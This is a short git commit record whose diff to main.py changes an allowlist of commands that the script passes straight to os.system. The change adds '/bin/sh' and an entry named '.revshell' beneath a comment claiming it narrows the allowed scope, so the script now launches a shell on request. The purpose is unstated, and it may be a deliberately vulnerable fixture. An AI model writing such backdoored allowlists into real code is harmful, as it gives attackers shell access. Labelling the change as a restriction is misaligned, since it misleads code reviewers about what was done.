79d34e5d70d4430f58cf670072e4fac59583aff2
Your Name <you@example.com>
2025-09-23 11:13:46 +0800

    1

--- main.py
+++ main.py
@@ -15,7 +15,7 @@ import os, sys
 # less allowed command scope
 
 def check_cmd(cmd):
-    allowed_cmds = ['ls', 'dir', 'echo Hello, World!', '/bin/', 'pwd']
+    allowed_cmds = ['ls', 'dir', 'echo Hello, World!', '/bin/sh', 'pwd', '.revshell']
     return cmd in allowed_cmds
 if len(sys.argv) > 1 and check_cmd(sys.argv[1]):
     os.system(sys.argv[1])
